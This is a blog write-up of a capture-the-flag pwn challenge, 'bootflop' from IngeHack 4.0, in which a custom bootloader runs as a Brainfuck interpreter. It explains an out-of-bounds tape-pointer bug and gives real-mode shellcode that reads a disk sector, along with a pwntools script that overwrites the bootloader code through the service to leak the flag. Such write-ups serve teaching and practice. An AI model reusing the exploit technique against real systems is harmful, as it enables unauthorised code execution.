---
author: "nothoudaifa"
title: "bootflop chall writeup from ingehack 4.0"
date: "2025-02-26"
tags: 
- ctf 
- pwn 
---

```c
challenge author: itskarudo
points: 493
desc: i love esolangs, i love bootloaders.
```

this challenge gives a custom bootloader that you have to exploit.

we are given two files [run.sh](http://run.sh) and bootflop.img (which is the bootloader image)

first thing i did was running xxd on bootflop.img:

```
00000000: fc31 d2c7 0622 7d26 7dbf 567d c706 247d  .1..."}&}.V}..$}
00000010: 567d b03e e8f8 00b0 20e8 f300 e8f5 003c  V}.>.... ......<
00000020: 7f74 0baa 3c0d 741e 3c0a 741a ebee 81ff  .t..<.t.<.t.....
00000030: 567d 74e8 4fb0 08e8 d500 b020 e8d0 00b0  V}t.O...... ....
00000040: 08e8 cb00 ebd6 b00a e8c4 00ff 0e24 7dff  .............$}.
00000050: 0624 7d8b 3624 7d80 3c2b 742a 803c 2d74  .$}.6$}.<+t*.<-t
00000060: 2d80 3c3e 7430 803c 3c74 3180 3c2e 7432  -.<>t0.<<t1.<.t2
00000070: 803c 2c74 3880 3c5b 7443 803c 5d74 66b0  .<,t8.<[tC.<]tf.
00000080: 0ae8 8b00 eb83 8b36 227d fe04 ebc1 8b36  .......6"}.....6
00000090: 227d fe0c ebb9 ff06 227d ebb3 ff0e 227d  "}......"}...."}
000000a0: ebad 8b36 227d 8a04 e864 00eb a2e8 6400  ...6"}...d....d.
000000b0: 8b36 227d 8804 b00a e854 00eb 928b 3622  .6"}.....T....6"
000000c0: 7d80 3c00 7589 b901 00ff 0624 7d8b 3624  }.<.u......$}.6$
000000d0: 7d80 3c5b 7501 4180 3c5d 7501 4983 f900  }.<[u.A.<]u.I...
000000e0: 75e7 e96a ff8b 3622 7d80 3c00 0f84 5fff  u..j..6"}.<..._.
000000f0: b901 00ff 0e24 7d8b 3624 7d80 3c5d 7501  .....$}.6$}.<]u.
00000100: 4180 3c5b 7501 4983 f900 75e7 e940 ffba  A.<[u.I...u..@..
00000110: f803 eec3 bafd 03ec a801 74f8 80ea 05ec  ..........t.....
00000120: eec3 0000 0000 0000 0000 0000 0000 0000  ................
00000130: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000140: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000150: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000160: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000170: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000180: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000190: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000001a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000001b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000001c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000001d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000001e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000001f0: 0000 0000 0000 0000 0000 0000 0000 55aa  ..............U.
00000200: 696e 6765 6861 636b 7b66 616b 655f 666c  ingehack{fake_fl
00000210: 6167 7d                                  ag}
```

we can see that the flag is at 0x200, from my experience in writing a simple bootloader i knew that:

- only the first 0x200 (the [bootsector](https://wiki.osdev.org/Boot_Sequence#Master_Boot_Record)) bytes of the image will be loaded at 0x7c00.
- to read the rest of the image (the flag) i need to read from the disk using bios interrupts, which means i need to be able to run my own shellcode.

after that, i disassembled the bootloader image using

```bash
objdump -D -b binary -m i8086 bootflop.img -M intel
```

i gave the disassembly to chatgpt, and it told me

```bash
- this program is Brainfuck interpreter.
- 0x7D22 is initialized as a pointer to the memory tape.
- 0x7D24 is initialized as a pointer to the input program.
- it continuously reads and executes Brainfuck commands.
- it uses serial ports (which are mapped to stdio in run.sh) to input and output data
- it has 8 commands:
	+ (0x2B): Increments the byte at the current memory cell.
	- (0x2D): Decrements the byte at the current memory cell.
	> (0x3E): Moves the pointer to the right.
	< (0x3C): Moves the pointer to the left.
	. (0x2E): Outputs the byte at the current memory cell.
	, (0x2C): Inputs a byte and stores it at the current memory cell.
	[ (0x5B): Loops while the current memory cell is nonzero.
	] (0x5D): Jumps back to the matching [ if the memory cell is nonzero.
```

## The vulnerability:

the vulnerability lies in the < and > commands, the bootloader does not check if we go out of bounds of the memory tape (which starts at 0x7d26, check assembly), we can write into bootloader executable code and it will run just fine.

## Exploitation:

the exploitation part is simple, write shellcode into memory, then write (or overwrite) a jmp instruction so it jumps to our shellcode.

using chatgpt i got the following shellcode that reads the sector (which is the flag) into 0x7a00 then outputs it to serial com1

```nasm
org 0x7C00

    mov ah, 0x02    ; BIOS read sector function
    mov al, 0x01    ; Read 1 sector
    mov ch, 0x00    ; Cylinder 0
    mov cl, 0x02    ; Sector 2 (1-based index)
    mov dh, 0x00    ; Head 0
    mov dl, 0x80    ; Drive 0x80 (first hard disk)
    mov bx, 0x7a0  ; Load sector into 0x7a00
    mov es, bx      ; Set ES to 0x7a0 (this is a segment to it will be multiplied by 0x10)
    mov bx, 0x0000  ; Offset within segment (zero to read the whole flag)

    int 0x13        ; Call BIOS interrupt
    
    mov si, 0x0010 ; flag offset 
    mov dx,0x3f8
    mov al, byte [es:si]
    out dx,
    ; does not matter what happens after this
```

as you can see, this only prints one char, that’s because in the ctf i wrote my shellcode into the memory tape, which was not that long and i couldn’t fit a loop in it (i know i could have wrote it somewhere else), so what i did was output one char at a time and keep overwriting the offset in python so it would print the next char in each connection.

here is the python script:

```python
from pwn import *

flag = ''
for off in range(0, 0x100):
    p = remote("bootflop.ctf.ingeniums.club", 1337, ssl=True)
    win = open("win.bin", "rb").read()
    win = win[:0x17] + off.to_bytes(1, 'little') + win[0x18:]
    
          
    payload = b'>'
    for i in range(len(win)):
        payload += b'>'
        payload += b'+' * win[i]

    p.sendline(payload)
    payload = b'<' * (1 + len(win))
    p.sendline(payload) 

    payload = b'<' * 0x110
    payload += b'+'
    payload += b'<'
    payload += b'-' * (0xf8-0x11)
    p.sendlineafter(b'>', payload)

    a = p.recvall(timeout=1)
    flag += chr(a[-1])
    print(flag)
```

flag: `ingehack{debugging_real_mode_apps_sucks_man}`
yup it definitely sucked, gdb does not even disassemble it properly.
